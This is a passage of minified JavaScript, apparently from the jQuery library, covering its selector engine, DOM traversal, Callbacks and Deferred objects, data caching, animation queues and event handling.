                        M.apply(l, x), u && !r && x.length > 0 && v + e.length > 1 && rt.uniqueSort(l)
                    }
                    return u && (k = _, c = w), b
                };
            return n ? at(r) : r
        }
        return gt.prototype = i.filters = i.pseudos, i.setFilters = new gt, s = rt.tokenize = function(t, e) {
            var n, o, r, s, a, l, c, u = S[t + " "];
            if (u) return e ? 0 : u.slice(0);
            for (a = t, l = [], c = i.preFilter; a;) {
                for (s in n && !(o = q.exec(a)) || (o && (a = a.slice(o[0].length) || a), l.push(r = [])), n = !1, (o = z.exec(a)) && (n = o.shift(), r.push({
                        value: n,
                        type: o[0].replace(B, " ")
                    }), a = a.slice(n.length)), i.filter) !(o = V[s].exec(a)) || c[s] && !(o = c[s](o)) || (n = o.shift(), r.push({
                    value: n,
                    type: s,
                    matches: o
                }), a = a.slice(n.length));
                if (!n) break
            }
            return e ? a.length : a ? rt.error(t) : S(t, l).slice(0)
        }, a = rt.compile = function(t, e) {
            var n, i = [],
                o = [],
                r = T[t + " "];
            if (!r) {
                for (e || (e = s(t)), n = e.length; n--;)(r = kt(e[n]))[x] ? i.push(r) : o.push(r);
                (r = T(t, Ct(o, i))).selector = t
            }
            return r
        }, l = rt.select = function(t, e, n, o) {
            var r, l, c, u, p, h = "function" == typeof t && t,
                d = !o && s(t = h.selector || t);
            if (n = n || [], 1 === d.length) {
                if ((l = d[0] = d[0].slice(0)).length > 2 && "ID" === (c = l[0]).type && 9 === e.nodeType && m && i.relative[l[1].type]) {
                    if (!(e = (i.find.ID(c.matches[0].replace(J, tt), e) || [])[0])) return n;
                    h && (e = e.parentNode), t = t.slice(l.shift().value.length)
                }
                for (r = V.needsContext.test(t) ? 0 : l.length; r-- && (c = l[r], !i.relative[u = c.type]);)
                    if ((p = i.find[u]) && (o = p(c.matches[0].replace(J, tt), K.test(l[0].type) && mt(e.parentNode) || e))) {
                        if (l.splice(r, 1), !(t = o.length && vt(l))) return M.apply(n, o), n;
                        break
                    }
            }
            return (h || a(t, d))(o, e, !m, n, !e || K.test(t) && mt(e.parentNode) || e), n
        }, n.sortStable = x.split("").sort(E).join("") === x, n.detectDuplicates = !!p, h(), n.sortDetached = lt((function(t) {
            return 1 & t.compareDocumentPosition(d.createElement("fieldset"))
        })), lt((function(t) {
            return t.innerHTML = "<a href='#'></a>", "#" === t.firstChild.getAttribute("href")
        })) || ct("type|href|height|width", (function(t, e, n) {
            if (!n) return t.getAttribute(e, "type" === e.toLowerCase() ? 1 : 2)
        })), n.attributes && lt((function(t) {
            return t.innerHTML = "<input/>", t.firstChild.setAttribute("value", ""), "" === t.firstChild.getAttribute("value")
        })) || ct("value", (function(t, e, n) {
            if (!n && "input" === t.nodeName.toLowerCase()) return t.defaultValue
        })), lt((function(t) {
            return null == t.getAttribute("disabled")
        })) || ct(L, (function(t, e, n) {
            var i;
            if (!n) return !0 === t[e] ? e.toLowerCase() : (i = t.getAttributeNode(e)) && i.specified ? i.value : null
        })), rt
    }(t);
    v.find = C, v.expr = C.selectors, v.expr[":"] = v.expr.pseudos, v.uniqueSort = v.unique = C.uniqueSort, v.text = C.getText, v.isXMLDoc = C.isXML, v.contains = C.contains, v.escapeSelector = C.escape;
    var _ = function(t, e, n) {
            for (var i = [], o = void 0 !== n;
                (t = t[e]) && 9 !== t.nodeType;)
                if (1 === t.nodeType) {
                    if (o && v(t).is(n)) break;
                    i.push(t)
                }
            return i
        },
        S = function(t, e) {
            for (var n = []; t; t = t.nextSibling) 1 === t.nodeType && t !== e && n.push(t);
            return n
        },
        T = v.expr.match.needsContext;

    function E(t, e) {
        return t.nodeName && t.nodeName.toLowerCase() === e.toLowerCase()
    }
    var P = /^<([a-z][^\/\0>:\x20\t\r\n\f]*)[\x20\t\r\n\f]*\/?>(?:<\/\1>|)$/i,
        $ = /^.[^:#\[\.,]*$/;

    function A(t, e, n) {
        return v.isFunction(e) ? v.grep(t, (function(t, i) {
            return !!e.call(t, i, t) !== n
        })) : e.nodeType ? v.grep(t, (function(t) {
            return t === e !== n
        })) : "string" != typeof e ? v.grep(t, (function(t) {
            return l.call(e, t) > -1 !== n
        })) : $.test(e) ? v.filter(e, t, n) : (e = v.filter(e, t), v.grep(t, (function(t) {
            return l.call(e, t) > -1 !== n && 1 === t.nodeType
        })))
    }
    v.filter = function(t, e, n) {
        var i = e[0];
        return n && (t = ":not(" + t + ")"), 1 === e.length && 1 === i.nodeType ? v.find.matchesSelector(i, t) ? [i] : [] : v.find.matches(t, v.grep(e, (function(t) {
            return 1 === t.nodeType
        })))
    }, v.fn.extend({
        find: function(t) {
            var e, n, i = this.length,
                o = this;
            if ("string" != typeof t) return this.pushStack(v(t).filter((function() {
                for (e = 0; e < i; e++)
                    if (v.contains(o[e], this)) return !0
            })));
            for (n = this.pushStack([]), e = 0; e < i; e++) v.find(t, o[e], n);
            return i > 1 ? v.uniqueSort(n) : n
        },
        filter: function(t) {
            return this.pushStack(A(this, t || [], !1))
        },
        not: function(t) {
            return this.pushStack(A(this, t || [], !0))
        },
        is: function(t) {
            return !!A(this, "string" == typeof t && T.test(t) ? v(t) : t || [], !1).length
        }
    });
    var D, M = /^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]+))$/;
    (v.fn.init = function(t, e, n) {
        var o, r;
        if (!t) return this;
        if (n = n || D, "string" == typeof t) {
            if (!(o = "<" === t[0] && ">" === t[t.length - 1] && t.length >= 3 ? [null, t, null] : M.exec(t)) || !o[1] && e) return !e || e.jquery ? (e || n).find(t) : this.constructor(e).find(t);
            if (o[1]) {
                if (e = e instanceof v ? e[0] : e, v.merge(this, v.parseHTML(o[1], e && e.nodeType ? e.ownerDocument || e : i, !0)), P.test(o[1]) && v.isPlainObject(e))
                    for (o in e) v.isFunction(this[o]) ? this[o](e[o]) : this.attr(o, e[o]);
                return this
            }
            return (r = i.getElementById(o[2])) && (this[0] = r, this.length = 1), this
        }
        return t.nodeType ? (this[0] = t, this.length = 1, this) : v.isFunction(t) ? void 0 !== n.ready ? n.ready(t) : t(v) : v.makeArray(t, this)
    }).prototype = v.fn, D = v(i);
    var O = /^(?:parents|prev(?:Until|All))/,
        j = {
            children: !0,
            contents: !0,
            next: !0,
            prev: !0
        };

    function L(t, e) {
        for (;
            (t = t[e]) && 1 !== t.nodeType;);
        return t
    }
    v.fn.extend({
        has: function(t) {
            var e = v(t, this),
                n = e.length;
            return this.filter((function() {
                for (var t = 0; t < n; t++)
                    if (v.contains(this, e[t])) return !0
            }))
        },
        closest: function(t, e) {
            var n, i = 0,
                o = this.length,
                r = [],
                s = "string" != typeof t && v(t);
            if (!T.test(t))
                for (; i < o; i++)
                    for (n = this[i]; n && n !== e; n = n.parentNode)
                        if (n.nodeType < 11 && (s ? s.index(n) > -1 : 1 === n.nodeType && v.find.matchesSelector(n, t))) {
                            r.push(n);
                            break
                        }
            return this.pushStack(r.length > 1 ? v.uniqueSort(r) : r)
        },
        index: function(t) {
            return t ? "string" == typeof t ? l.call(v(t), this[0]) : l.call(this, t.jquery ? t[0] : t) : this[0] && this[0].parentNode ? this.first().prevAll().length : -1
        },
        add: function(t, e) {
            return this.pushStack(v.uniqueSort(v.merge(this.get(), v(t, e))))
        },
        addBack: function(t) {
            return this.add(null == t ? this.prevObject : this.prevObject.filter(t))
        }
    }), v.each({
        parent: function(t) {
            var e = t.parentNode;
            return e && 11 !== e.nodeType ? e : null
        },
        parents: function(t) {
            return _(t, "parentNode")
        },
        parentsUntil: function(t, e, n) {
            return _(t, "parentNode", n)
        },
        next: function(t) {
            return L(t, "nextSibling")
        },
        prev: function(t) {
            return L(t, "previousSibling")
        },
        nextAll: function(t) {
            return _(t, "nextSibling")
        },
        prevAll: function(t) {
            return _(t, "previousSibling")
        },
        nextUntil: function(t, e, n) {
            return _(t, "nextSibling", n)
        },
        prevUntil: function(t, e, n) {
            return _(t, "previousSibling", n)
        },
        siblings: function(t) {
            return S((t.parentNode || {}).firstChild, t)
        },
        children: function(t) {
            return S(t.firstChild)
        },
        contents: function(t) {
            return E(t, "iframe") ? t.contentDocument : (E(t, "template") && (t = t.content || t), v.merge([], t.childNodes))
        }
    }, (function(t, e) {
        v.fn[t] = function(n, i) {
            var o = v.map(this, e, n);
            return "Until" !== t.slice(-5) && (i = n), i && "string" == typeof i && (o = v.filter(i, o)), this.length > 1 && (j[t] || v.uniqueSort(o), O.test(t) && o.reverse()), this.pushStack(o)
        }
    }));
    var F = /[^\x20\t\r\n\f]+/g;

    function N(t) {
        return t
    }

    function I(t) {
        throw t
    }

    function R(t, e, n, i) {
        var o;
        try {
            t && v.isFunction(o = t.promise) ? o.call(t).done(e).fail(n) : t && v.isFunction(o = t.then) ? o.call(t, e, n) : e.apply(void 0, [t].slice(i))
        } catch (t) {
            n.apply(void 0, [t])
        }
    }
    v.Callbacks = function(t) {
        t = "string" == typeof t ? function(t) {
            var e = {};
            return v.each(t.match(F) || [], (function(t, n) {
                e[n] = !0
            })), e
        }(t) : v.extend({}, t);
        var e, n, i, o, r = [],
            s = [],
            a = -1,
            l = function() {
                for (o = o || t.once, i = e = !0; s.length; a = -1)
                    for (n = s.shift(); ++a < r.length;) !1 === r[a].apply(n[0], n[1]) && t.stopOnFalse && (a = r.length, n = !1);
                t.memory || (n = !1), e = !1, o && (r = n ? [] : "")
            },
            c = {
                add: function() {
                    return r && (n && !e && (a = r.length - 1, s.push(n)), function e(n) {
                        v.each(n, (function(n, i) {
                            v.isFunction(i) ? t.unique && c.has(i) || r.push(i) : i && i.length && "string" !== v.type(i) && e(i)
                        }))
                    }(arguments), n && !e && l()), this
                },
                remove: function() {
                    return v.each(arguments, (function(t, e) {
                        for (var n;
                            (n = v.inArray(e, r, n)) > -1;) r.splice(n, 1), n <= a && a--
                    })), this
                },
                has: function(t) {
                    return t ? v.inArray(t, r) > -1 : r.length > 0
                },
                empty: function() {
                    return r && (r = []), this
                },
                disable: function() {
                    return o = s = [], r = n = "", this
                },
                disabled: function() {
                    return !r
                },
                lock: function() {
                    return o = s = [], n || e || (r = n = ""), this
                },
                locked: function() {
                    return !!o
                },
                fireWith: function(t, n) {
                    return o || (n = [t, (n = n || []).slice ? n.slice() : n], s.push(n), e || l()), this
                },
                fire: function() {
                    return c.fireWith(this, arguments), this
                },
                fired: function() {
                    return !!i
                }
            };
        return c
    }, v.extend({
        Deferred: function(e) {
            var n = [
                    ["notify", "progress", v.Callbacks("memory"), v.Callbacks("memory"), 2],
                    ["resolve", "done", v.Callbacks("once memory"), v.Callbacks("once memory"), 0, "resolved"],
                    ["reject", "fail", v.Callbacks("once memory"), v.Callbacks("once memory"), 1, "rejected"]
                ],
                i = "pending",
                o = {
                    state: function() {
                        return i
                    },
                    always: function() {
                        return r.done(arguments).fail(arguments), this
                    },
                    catch: function(t) {
                        return o.then(null, t)
                    },
                    pipe: function() {
                        var t = arguments;
                        return v.Deferred((function(e) {
                            v.each(n, (function(n, i) {
                                var o = v.isFunction(t[i[4]]) && t[i[4]];
                                r[i[1]]((function() {
                                    var t = o && o.apply(this, arguments);
                                    t && v.isFunction(t.promise) ? t.promise().progress(e.notify).done(e.resolve).fail(e.reject) : e[i[0] + "With"](this, o ? [t] : arguments)
                                }))
                            })), t = null
                        })).promise()
                    },
                    then: function(e, i, o) {
                        var r = 0;

                        function s(e, n, i, o) {
                            return function() {
                                var a = this,
                                    l = arguments,
                                    c = function() {
                                        var t, c;
                                        if (!(e < r)) {
                                            if ((t = i.apply(a, l)) === n.promise()) throw new TypeError("Thenable self-resolution");
                                            c = t && ("object" == typeof t || "function" == typeof t) && t.then, v.isFunction(c) ? o ? c.call(t, s(r, n, N, o), s(r, n, I, o)) : (r++, c.call(t, s(r, n, N, o), s(r, n, I, o), s(r, n, N, n.notifyWith))) : (i !== N && (a = void 0, l = [t]), (o || n.resolveWith)(a, l))
                                        }
                                    },
                                    u = o ? c : function() {
                                        try {
                                            c()
                                        } catch (t) {
                                            v.Deferred.exceptionHook && v.Deferred.exceptionHook(t, u.stackTrace), e + 1 >= r && (i !== I && (a = void 0, l = [t]), n.rejectWith(a, l))
                                        }
                                    };
                                e ? u() : (v.Deferred.getStackHook && (u.stackTrace = v.Deferred.getStackHook()), t.setTimeout(u))
                            }
                        }
                        return v.Deferred((function(t) {
                            n[0][3].add(s(0, t, v.isFunction(o) ? o : N, t.notifyWith)), n[1][3].add(s(0, t, v.isFunction(e) ? e : N)), n[2][3].add(s(0, t, v.isFunction(i) ? i : I))
                        })).promise()
                    },
                    promise: function(t) {
                        return null != t ? v.extend(t, o) : o
                    }
                },
                r = {};
            return v.each(n, (function(t, e) {
                var s = e[2],
                    a = e[5];
                o[e[1]] = s.add, a && s.add((function() {
                    i = a
                }), n[3 - t][2].disable, n[0][2].lock), s.add(e[3].fire), r[e[0]] = function() {
                    return r[e[0] + "With"](this === r ? void 0 : this, arguments), this
                }, r[e[0] + "With"] = s.fireWith
            })), o.promise(r), e && e.call(r, r), r
        },
        when: function(t) {
            var e = arguments.length,
                n = e,
                i = Array(n),
                o = r.call(arguments),
                s = v.Deferred(),
                a = function(t) {
                    return function(n) {
                        i[t] = this, o[t] = arguments.length > 1 ? r.call(arguments) : n, --e || s.resolveWith(i, o)
                    }
                };
            if (e <= 1 && (R(t, s.done(a(n)).resolve, s.reject, !e), "pending" === s.state() || v.isFunction(o[n] && o[n].then))) return s.then();
            for (; n--;) R(o[n], a(n), s.reject);
            return s.promise()
        }
    });
    var H = /^(Eval|Internal|Range|Reference|Syntax|Type|URI)Error$/;
    v.Deferred.exceptionHook = function(e, n) {
        t.console && t.console.warn && e && H.test(e.name) && t.console.warn("jQuery.Deferred exception: " + e.message, e.stack, n)
    }, v.readyException = function(e) {
        t.setTimeout((function() {
            throw e
        }))
    };
    var B = v.Deferred();

    function q() {
        i.removeEventListener("DOMContentLoaded", q), t.removeEventListener("load", q), v.ready()
    }
    v.fn.ready = function(t) {
        return B.then(t).catch((function(t) {
            v.readyException(t)
        })), this
    }, v.extend({
        isReady: !1,
        readyWait: 1,
        ready: function(t) {
            (!0 === t ? --v.readyWait : v.isReady) || (v.isReady = !0, !0 !== t && --v.readyWait > 0 || B.resolveWith(i, [v]))
        }
    }), v.ready.then = B.then, "complete" === i.readyState || "loading" !== i.readyState && !i.documentElement.doScroll ? t.setTimeout(v.ready) : (i.addEventListener("DOMContentLoaded", q), t.addEventListener("load", q));
    var z = function(t, e, n, i, o, r, s) {
            var a = 0,
                l = t.length,
                c = null == n;
            if ("object" === v.type(n))
                for (a in o = !0, n) z(t, e, a, n[a], !0, r, s);
            else if (void 0 !== i && (o = !0, v.isFunction(i) || (s = !0), c && (s ? (e.call(t, i), e = null) : (c = e, e = function(t, e, n) {
                    return c.call(v(t), n)
                })), e))
                for (; a < l; a++) e(t[a], n, s ? i : i.call(t[a], a, e(t[a], n)));
            return o ? t : c ? e.call(t) : l ? e(t[0], n) : r
        },
        W = function(t) {
            return 1 === t.nodeType || 9 === t.nodeType || !+t.nodeType
        };

    function G() {
        this.expando = v.expando + G.uid++
    }
    G.uid = 1, G.prototype = {
        cache: function(t) {
            var e = t[this.expando];
            return e || (e = {}, W(t) && (t.nodeType ? t[this.expando] = e : Object.defineProperty(t, this.expando, {
                value: e,
                configurable: !0
            }))), e
        },
        set: function(t, e, n) {
            var i, o = this.cache(t);
            if ("string" == typeof e) o[v.camelCase(e)] = n;
            else
                for (i in e) o[v.camelCase(i)] = e[i];
            return o
        },
        get: function(t, e) {
            return void 0 === e ? this.cache(t) : t[this.expando] && t[this.expando][v.camelCase(e)]
        },
        access: function(t, e, n) {
            return void 0 === e || e && "string" == typeof e && void 0 === n ? this.get(t, e) : (this.set(t, e, n), void 0 !== n ? n : e)
        },
        remove: function(t, e) {
            var n, i = t[this.expando];
            if (void 0 !== i) {
                if (void 0 !== e) {
                    Array.isArray(e) ? e = e.map(v.camelCase) : e = (e = v.camelCase(e)) in i ? [e] : e.match(F) || [], n = e.length;
                    for (; n--;) delete i[e[n]]
                }(void 0 === e || v.isEmptyObject(i)) && (t.nodeType ? t[this.expando] = void 0 : delete t[this.expando])
            }
        },
        hasData: function(t) {
            var e = t[this.expando];
            return void 0 !== e && !v.isEmptyObject(e)
        }
    };
    var X = new G,
        V = new G,
        U = /^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,
        Y = /[A-Z]/g;

    function Q(t, e, n) {
        var i;
        if (void 0 === n && 1 === t.nodeType)
            if (i = "data-" + e.replace(Y, "-$&").toLowerCase(), "string" == typeof(n = t.getAttribute(i))) {
                try {
                    n = function(t) {
                        return "true" === t || "false" !== t && ("null" === t ? null : t === +t + "" ? +t : U.test(t) ? JSON.parse(t) : t)
                    }(n)
                } catch (t) {}
                V.set(t, e, n)
            } else n = void 0;
        return n
    }
    v.extend({
        hasData: function(t) {
            return V.hasData(t) || X.hasData(t)
        },
        data: function(t, e, n) {
            return V.access(t, e, n)
        },
        removeData: function(t, e) {
            V.remove(t, e)
        },
        _data: function(t, e, n) {
            return X.access(t, e, n)
        },
        _removeData: function(t, e) {
            X.remove(t, e)
        }
    }), v.fn.extend({
        data: function(t, e) {
            var n, i, o, r = this[0],
                s = r && r.attributes;
            if (void 0 === t) {
                if (this.length && (o = V.get(r), 1 === r.nodeType && !X.get(r, "hasDataAttrs"))) {
                    for (n = s.length; n--;) s[n] && (0 === (i = s[n].name).indexOf("data-") && (i = v.camelCase(i.slice(5)), Q(r, i, o[i])));
                    X.set(r, "hasDataAttrs", !0)
                }
                return o
            }
            return "object" == typeof t ? this.each((function() {
                V.set(this, t)
            })) : z(this, (function(e) {
                var n;
                if (r && void 0 === e) {
                    if (void 0 !== (n = V.get(r, t))) return n;
                    if (void 0 !== (n = Q(r, t))) return n
                } else this.each((function() {
                    V.set(this, t, e)
                }))
            }), null, e, arguments.length > 1, null, !0)
        },
        removeData: function(t) {
            return this.each((function() {
                V.remove(this, t)
            }))
        }
    }), v.extend({
        queue: function(t, e, n) {
            var i;
            if (t) return e = (e || "fx") + "queue", i = X.get(t, e), n && (!i || Array.isArray(n) ? i = X.access(t, e, v.makeArray(n)) : i.push(n)), i || []
        },
        dequeue: function(t, e) {
            e = e || "fx";
            var n = v.queue(t, e),
                i = n.length,
                o = n.shift(),
                r = v._queueHooks(t, e);
            "inprogress" === o && (o = n.shift(), i--), o && ("fx" === e && n.unshift("inprogress"), delete r.stop, o.call(t, (function() {
                v.dequeue(t, e)
            }), r)), !i && r && r.empty.fire()
        },
        _queueHooks: function(t, e) {
            var n = e + "queueHooks";
            return X.get(t, n) || X.access(t, n, {
                empty: v.Callbacks("once memory").add((function() {
                    X.remove(t, [e + "queue", n])
                }))
            })
        }
    }), v.fn.extend({
        queue: function(t, e) {
            var n = 2;
            return "string" != typeof t && (e = t, t = "fx", n--), arguments.length < n ? v.queue(this[0], t) : void 0 === e ? this : this.each((function() {
                var n = v.queue(this, t, e);
                v._queueHooks(this, t), "fx" === t && "inprogress" !== n[0] && v.dequeue(this, t)
            }))
        },
        dequeue: function(t) {
            return this.each((function() {
                v.dequeue(this, t)
            }))
        },
        clearQueue: function(t) {
            return this.queue(t || "fx", [])
        },
        promise: function(t, e) {
            var n, i = 1,
                o = v.Deferred(),
                r = this,
                s = this.length,
                a = function() {
                    --i || o.resolveWith(r, [r])
                };
            for ("string" != typeof t && (e = t, t = void 0), t = t || "fx"; s--;)(n = X.get(r[s], t + "queueHooks")) && n.empty && (i++, n.empty.add(a));
            return a(), o.promise(e)
        }
    });
    var Z = /[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,
        K = new RegExp("^(?:([+-])=|)(" + Z + ")([a-z%]*)$", "i"),
        J = ["Top", "Right", "Bottom", "Left"],
        tt = function(t, e) {
            return "none" === (t = e || t).style.display || "" === t.style.display && v.contains(t.ownerDocument, t) && "none" === v.css(t, "display")
        },
        et = function(t, e, n, i) {
            var o, r, s = {};
            for (r in e) s[r] = t.style[r], t.style[r] = e[r];
            for (r in o = n.apply(t, i || []), e) t.style[r] = s[r];
            return o
        };

    function nt(t, e, n, i) {
        var o, r = 1,
            s = 20,
            a = i ? function() {
                return i.cur()
            } : function() {
                return v.css(t, e, "")
            },
            l = a(),
            c = n && n[3] || (v.cssNumber[e] ? "" : "px"),
            u = (v.cssNumber[e] || "px" !== c && +l) && K.exec(v.css(t, e));
        if (u && u[3] !== c) {
            c = c || u[3], n = n || [], u = +l || 1;
            do {
                u /= r = r || ".5", v.style(t, e, u + c)
            } while (r !== (r = a() / l) && 1 !== r && --s)
        }
        return n && (u = +u || +l || 0, o = n[1] ? u + (n[1] + 1) * n[2] : +n[2], i && (i.unit = c, i.start = u, i.end = o)), o
    }
    var it = {};

    function ot(t) {
        var e, n = t.ownerDocument,
            i = t.nodeName,
            o = it[i];
        return o || (e = n.body.appendChild(n.createElement(i)), o = v.css(e, "display"), e.parentNode.removeChild(e), "none" === o && (o = "block"), it[i] = o, o)
    }

    function rt(t, e) {
        for (var n, i, o = [], r = 0, s = t.length; r < s; r++)(i = t[r]).style && (n = i.style.display, e ? ("none" === n && (o[r] = X.get(i, "display") || null, o[r] || (i.style.display = "")), "" === i.style.display && tt(i) && (o[r] = ot(i))) : "none" !== n && (o[r] = "none", X.set(i, "display", n)));
        for (r = 0; r < s; r++) null != o[r] && (t[r].style.display = o[r]);
        return t
    }
    v.fn.extend({
        show: function() {
            return rt(this, !0)
        },
        hide: function() {
            return rt(this)
        },
        toggle: function(t) {
            return "boolean" == typeof t ? t ? this.show() : this.hide() : this.each((function() {
                tt(this) ? v(this).show() : v(this).hide()
            }))
        }
    });
    var st = /^(?:checkbox|radio)$/i,
        at = /<([a-z][^\/\0>\x20\t\r\n\f]+)/i,
        lt = /^$|\/(?:java|ecma)script/i,
        ct = {
            option: [1, "<select multiple='multiple'>", "</select>"],
            thead: [1, "<table>", "</table>"],
            col: [2, "<table><colgroup>", "</colgroup></table>"],
            tr: [2, "<table><tbody>", "</tbody></table>"],
            td: [3, "<table><tbody><tr>", "</tr></tbody></table>"],
            _default: [0, "", ""]
        };

    function ut(t, e) {
        var n;
        return n = void 0 !== t.getElementsByTagName ? t.getElementsByTagName(e || "*") : void 0 !== t.querySelectorAll ? t.querySelectorAll(e || "*") : [], void 0 === e || e && E(t, e) ? v.merge([t], n) : n
    }

    function pt(t, e) {
        for (var n = 0, i = t.length; n < i; n++) X.set(t[n], "globalEval", !e || X.get(e[n], "globalEval"))
    }
    ct.optgroup = ct.option, ct.tbody = ct.tfoot = ct.colgroup = ct.caption = ct.thead, ct.th = ct.td;
    var ht = /<|&#?\w+;/;

    function dt(t, e, n, i, o) {
        for (var r, s, a, l, c, u, p = e.createDocumentFragment(), h = [], d = 0, f = t.length; d < f; d++)
            if ((r = t[d]) || 0 === r)
                if ("object" === v.type(r)) v.merge(h, r.nodeType ? [r] : r);
                else if (ht.test(r)) {
            for (s = s || p.appendChild(e.createElement("div")), a = (at.exec(r) || ["", ""])[1].toLowerCase(), l = ct[a] || ct._default, s.innerHTML = l[1] + v.htmlPrefilter(r) + l[2], u = l[0]; u--;) s = s.lastChild;
            v.merge(h, s.childNodes), (s = p.firstChild).textContent = ""
        } else h.push(e.createTextNode(r));
        for (p.textContent = "", d = 0; r = h[d++];)
            if (i && v.inArray(r, i) > -1) o && o.push(r);
            else if (c = v.contains(r.ownerDocument, r), s = ut(p.appendChild(r), "script"), c && pt(s), n)
            for (u = 0; r = s[u++];) lt.test(r.type || "") && n.push(r);
        return p
    }! function() {
        var t = i.createDocumentFragment().appendChild(i.createElement("div")),
            e = i.createElement("input");
        e.setAttribute("type", "radio"), e.setAttribute("checked", "checked"), e.setAttribute("name", "t"), t.appendChild(e), f.checkClone = t.cloneNode(!0).cloneNode(!0).lastChild.checked, t.innerHTML = "<textarea>x</textarea>", f.noCloneChecked = !!t.cloneNode(!0).lastChild.defaultValue
    }();
    var ft = i.documentElement,
        mt = /^key/,
        gt = /^(?:mouse|pointer|contextmenu|drag|drop)|click/,
        vt = /^([^.]*)(?:\.(.+)|)/;

    function yt() {
        return !0
    }

    function bt() {
        return !1
    }

    function xt() {
        try {
            return i.activeElement
        } catch (t) {}
    }

    function wt(t, e, n, i, o, r) {
        var s, a;
        if ("object" == typeof e) {
            for (a in "string" != typeof n && (i = i || n, n = void 0), e) wt(t, a, n, i, e[a], r);
            return t
        }
        if (null == i && null == o ? (o = n, i = n = void 0) : null == o && ("string" == typeof n ? (o = i, i = void 0) : (o = i, i = n, n = void 0)), !1 === o) o = bt;
        else if (!o) return t;
        return 1 === r && (s = o, (o = function(t) {
            return v().off(t), s.apply(this, arguments)
        }).guid = s.guid || (s.guid = v.guid++)), t.each((function() {
            v.event.add(this, e, o, i, n)
        }))
    }
    v.event = {
        global: {},
        add: function(t, e, n, i, o) {
            var r, s, a, l, c, u, p, h, d, f, m, g = X.get(t);
            if (g)
                for (n.handler && (n = (r = n).handler, o = r.selector), o && v.find.matchesSelector(ft, o), n.guid || (n.guid = v.guid++), (l = g.events) || (l = g.events = {}), (s = g.handle) || (s = g.handle = function(e) {
                        return void 0 !== v && v.event.triggered !== e.type ? v.event.dispatch.apply(t, arguments) : void 0
                    }), c = (e = (e || "").match(F) || [""]).length; c--;) d = m = (a = vt.exec(e[c]) || [])[1], f = (a[2] || "").split(".").sort(), d && (p = v.event.special[d] || {}, d = (o ? p.delegateType : p.bindType) || d, p = v.event.special[d] || {}, u = v.extend({
                    type: d,
                    origType: m,
                    data: i,
                    handler: n,
                    guid: n.guid,
                    selector: o,
                    needsContext: o && v.expr.match.needsContext.test(o),
                    namespace: f.join(".")
                }, r), (h = l[d]) || ((h = l[d] = []).delegateCount = 0, p.setup && !1 !== p.setup.call(t, i, f, s) || t.addEventListener && t.addEventListener(d, s)), p.add && (p.add.call(t, u), u.handler.guid || (u.handler.guid = n.guid)), o ? h.splice(h.delegateCount++, 0, u) : h.push(u), v.event.global[d] = !0)
        },
        remove: function(t, e, n, i, o) {
            var r, s, a, l, c, u, p, h, d, f, m, g = X.hasData(t) && X.get(t);
            if (g && (l = g.events)) {
                for (c = (e = (e || "").match(F) || [""]).length; c--;)
                    if (d = m = (a = vt.exec(e[c]) || [])[1], f = (a[2] || "").split(".").sort(), d) {
                        for (p = v.event.special[d] || {}, h = l[d = (i ? p.delegateType : p.bindType) || d] || [], a = a[2] && new RegExp("(^|\\.)" + f.join("\\.(?:.*\\.|)") + "(\\.|$)"), s = r = h.length; r--;) u = h[r], !o && m !== u.origType || n && n.guid !== u.guid || a && !a.test(u.namespace) || i && i !== u.selector && ("**" !== i || !u.selector) || (h.splice(r, 1), u.selector && h.delegateCount--, p.remove && p.remove.call(t, u));
                        s && !h.length && (p.teardown && !1 !== p.teardown.call(t, f, g.handle) || v.removeEvent(t, d, g.handle), delete l[d])
                    } else
                        for (d in l) v.event.remove(t, d + e[c], n, i, !0);
                v.isEmptyObject(l) && X.remove(t, "handle events")
            }
        },
        dispatch: function(t) {
            var e, n, i, o, r, s, a = v.event.fix(t),
                l = new Array(arguments.length),
                c = (X.get(this, "events") || {})[a.type] || [],
                u = v.event.special[a.type] || {};
            for (l[0] = a, e = 1; e < arguments.length; e++) l[e] = arguments[e];
            if (a.delegateTarget = this, !u.preDispatch || !1 !== u.preDispatch.call(this, a)) {
                for (s = v.event.handlers.call(this, a, c), e = 0;
                    (o = s[e++]) && !a.isPropagationStopped();)
                    for (a.currentTarget = o.elem, n = 0;
                        (r = o.handlers[n++]) && !a.isImmediatePropagationStopped();) a.rnamespace && !a.rnamespace.test(r.namespace) || (a.handleObj = r, a.data = r.data, void 0 !== (i = ((v.event.special[r.origType] || {}).handle || r.handler).apply(o.elem, l)) && !1 === (a.result = i) && (a.preventDefault(), a.stopPropagation()));
                return u.postDispatch && u.postDispatch.call(this, a), a.result
            }
        },
        handlers: function(t, e) {
            var n, i, o, r, s, a = [],
                l = e.delegateCount,
                c = t.target;
            if (l && c.nodeType && !("click" === t.type && t.button >= 1))
                for (; c !== this; c = c.parentNode || this)
                    if (1 === c.nodeType && ("click" !== t.type || !0 !== c.disabled)) {
                        for (r = [], s = {}, n = 0; n < l; n++) void 0 === s[o = (i = e[n]).selector + " "] && (s[o] = i.needsContext ? v(o, this).index(c) > -1 : v.find(o, this, null, [c]).length), s[o] && r.push(i);
                        r.length && a.push({
                            elem: c,
                            handlers: r
                        })
                    }
            return c = this, l < e.length && a.push({
                elem: c,
                handlers: e.slice(l)
            }), a
        },
        addProp: function(t, e) {
            Object.defineProperty(v.Event.prototype, t, {
                enumerable: !0,
                configurable: !0,
                get: v.isFunction(e) ? function() {
                    if (this.originalEvent) return e(this.originalEvent)
                } : function() {
                    if (this.originalEvent) return this.originalEvent[t]
                },
                set: function(e) {
                    Object.defineProperty(this, t, {
                        enumerable: !0,
                        configurable: !0,
                        writable: !0,
                        value: e
                    })
                }
            })
        },
        fix: function(t) {
            return t[v.expando] ? t : new v.Event(t)
        },
        special: {
            load: {
                noBubble: !0
            },
            focus: {
                trigger: function() {
                    if (this !== xt() && this.focus) return this.focus(), !1
                },
                delegateType: "focusin"
            },
            blur: {
                trigger: function() {
                    if (this === xt() && this.blur) return this.blur(), !1
                },
                delegateType: "focusout"
            },
            click: {
                trigger: function() {
                    if ("checkbox" === this.type && this.click && E(this, "input")) return this.click(), !1
                },
                _default: function(t) {
                    return E(t.target, "a")
                }
            },
            beforeunload: {
                postDispatch: function(t) {
                    void 0 !== t.result && t.originalEvent && (t.originalEvent.returnValue = t.result)
                }
            }
        }
    }, v.removeEvent = function(t, e, n) {
        t.removeEventListener && t.removeEventListener(e, n)
    }, v.Event = function(t, e) {
